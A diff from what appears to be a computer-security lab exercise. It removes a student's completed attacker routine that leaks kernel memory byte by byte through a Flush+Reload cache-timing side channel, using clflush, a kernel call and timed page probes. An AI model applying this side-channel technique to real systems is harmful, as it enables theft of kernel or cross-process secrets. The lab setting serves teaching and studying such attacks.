@@ -53,45 +53,6 @@ int run_attacker(int kernel_fd, char *shared_memory) {
         // Find the value of leaked_byte for offset "current_offset"
         // leaked_byte = ??
 
-        // Begin User Code
-
-        char min_idx;
-        size_t min_val = 1000000;
-
-        // printf("Flush\n");
-        for (size_t j = 0; j < LAB2_SHARED_MEMORY_NUM_PAGES; j++) {
-            clflush((void *)(shared_memory + (j * LAB2_PAGE_SIZE)));
-        }
-
-        // printf("Call\n");
-        call_kernel_part1(kernel_fd, shared_memory, current_offset);
-
-        // printf("Probe\n");
-        for (size_t k = 0; k < LAB2_SHARED_MEMORY_NUM_PAGES; k++) {
-            int access_time;
-
-            access_time = time_access((void *)(shared_memory + (k * LAB2_PAGE_SIZE)));
-            // printf("access_time[%d]: %d\n", i, access_time);
-
-            if (access_time < min_val) {
-                min_val = access_time;
-                min_idx = k;
-            }
-
-            // if (access_time < 75) {
-            //     leaked_byte = k;
-            //     printf("leaked_byte: %c\n", leaked_byte);
-            //     break;
-            // }
-        }
-
-        printf("min_val: %d\n", min_val);
-
-        leaked_byte = min_idx;
-        printf("leaked_byte: %c\n", leaked_byte);
-
-        // End of User Code
-
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
             break;
